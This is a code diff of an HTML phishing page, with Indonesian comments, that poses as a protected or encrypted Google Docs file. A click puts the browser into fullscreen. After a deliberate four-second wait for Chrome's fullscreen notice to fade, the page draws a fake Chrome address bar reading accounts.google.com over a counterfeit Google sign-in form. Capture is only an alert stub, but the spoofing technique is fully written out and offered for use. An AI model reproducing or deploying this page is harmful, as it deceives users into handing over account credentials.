@@ -1,60 +1,68 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Google Document</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
     <style>
-        body { margin: 0; padding: 0; font-family: 'Roboto', sans-serif; background: #fff; overflow: hidden; }
-        /* Address Bar Palsu */
-        #fake-url {
-            display: none; width: 100%; height: 60px; background: #f1f3f4;
-            border-bottom: 1px solid #dadce0; align-items: center; padding: 0 15px; box-sizing: border-box;
+        body { margin: 0; font-family: sans-serif; background: #fff; overflow: hidden; }
+        /* Address Bar Palsu yang sangat mirip Chrome Android */
+        #fake-chrome-ui {
+            display: none; width: 100%; height: 56px; background: #fff;
+            border-bottom: 1px solid #dfe1e5; align-items: center; padding: 0 16px; box-sizing: border-box;
+            position: fixed; top: 0; z-index: 9999;
         }
-        .url-text { background: white; flex-grow: 1; margin: 0 10px; padding: 8px 15px; border-radius: 20px; font-size: 14px; color: #202124; border: 1px solid #dfe1e5; }
+        .url-box { background: #f1f3f4; flex-grow: 1; margin: 0 12px; padding: 10px 16px; border-radius: 24px; font-size: 14px; color: #202124; display: flex; align-items: center; }
         
-        /* Tombol Pemicu */
-        #trigger-box { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        .btn { background: #1a73e8; color: white; padding: 15px 40px; border: none; border-radius: 25px; font-size: 16px; font-weight: 500; }
+        #content { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; padding: 20px; text-align: center; }
+        .btn { background: #1a73e8; color: #fff; padding: 12px 24px; border: none; border-radius: 4px; font-weight: 500; margin-top: 20px; width: 100%; max-width: 280px; }
     </style>
 </head>
 <body>
 
-    <div id="trigger-box">
-        <img src="https://www.gstatic.com/images/branding/product/2x/docs_96dp.png" width="70">
-        <h2 style="font-weight: 400;">Protected File</h2>
-        <p style="color: #5f6368; padding: 0 40px; text-align: center;">You must be signed in to view this document.</p>
-        <button id="go" class="btn">Sign in to Google</button>
-    </div>
+<div id="content">
+    <img src="https://www.gstatic.com/images/branding/product/2x/docs_96dp.png" width="64">
+    <h2 id="msg">Document is Encrypted</h2>
+    <p id="sub-msg">Click below to decrypt and view the file.</p>
+    <button id="main-btn" class="btn">Decrypt Document</button>
+</div>
 
-    <div id="spoof-ui" style="display: none;">
-        <div id="fake-url">
-            <span style="font-size: 18px;">&#128274;</span>
-            <div class="url-text">accounts.google.com</div>
-            <span style="font-size: 18px;">&#8942;</span>
-        </div>
-        <div style="padding: 40px 20px;">
-            <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="75">
-            <h1 style="font-size: 24px; font-weight: 400; margin-top: 20px;">Sign in</h1>
-            <p>Use your Google Account</p>
-            <input type="text" placeholder="Email or phone" style="width: 100%; padding: 15px; margin: 20px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box;">
-            <button onclick="alert('Captured!')" style="width: 100%; background: #1a73e8; color: white; padding: 12px; border: none; border-radius: 4px; font-weight: 500;">Next</button>
-        </div>
-    </div>
+<div id="fake-chrome-ui">
+    <span style="color: #5f6368;">&#128274;</span>
+    <div class="url-box">accounts.google.com</div>
+    <span style="color: #5f6368;">&#8942;</span>
+</div>
 
-    <script>
-        document.getElementById('go').onclick = function() {
-            // MASUK MODE FULLSCREEN (Kunci Exploit HP)
-            let elem = document.documentElement;
-            if (elem.requestFullscreen) {
-                elem.requestFullscreen();
-            }
+<script>
+    const btn = document.getElementById('main-btn');
+    const ui = document.getElementById('fake-chrome-ui');
+    const msg = document.getElementById('msg');
 
-            // Tampilkan UI Palsu
-            document.getElementById('trigger-box').style.display = 'none';
-            document.getElementById('spoof-ui').style.display = 'block';
-            document.getElementById('fake-url').style.display = 'flex';
-        };
-    </script>
+    btn.onclick = function() {
+        // STAGE 1: MASUK FULLSCREEN
+        // Di sini notifikasi "Fullscreen" Chrome bakal muncul
+        document.documentElement.requestFullscreen();
+        
+        btn.innerText = "Loading Decryption...";
+        btn.disabled = true;
+
+        // STAGE 2: TUNGGU NOTIFIKASI CHROME ILANG (Biasanya 3 detik)
+        setTimeout(() => {
+            // Ganti isi halaman jadi Form Login Palsu
+            ui.style.display = 'flex';
+            document.getElementById('content').innerHTML = `
+                <div style="margin-top: 80px; width: 100%; text-align: left; padding: 0 20px; box-sizing: border-box;">
+                    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="74">
+                    <h1 style="font-size: 24px; font-weight: 400; margin-top: 15px;">Sign in</h1>
+                    <p>Use your Google Account</p>
+                    <input type="email" placeholder="Email or phone" style="width:100%; padding:14px; margin-top:20px; border:1px solid #dadce0; border-radius:4px; font-size:16px;">
+                    <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 40px;">
+                        <span style="color: #1a73e8; font-weight: 500;">Create account</span>
+                        <button style="background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px; font-weight:500;" onclick="alert('Exploit Success: Data Logged')">Next</button>
+                    </div>
+                </div>
+            `;
+        }, 4000); // Jeda 4 detik biar notif asli Chrome udah ilang duluan
+    };
+</script>
+
 </body>
 </html>
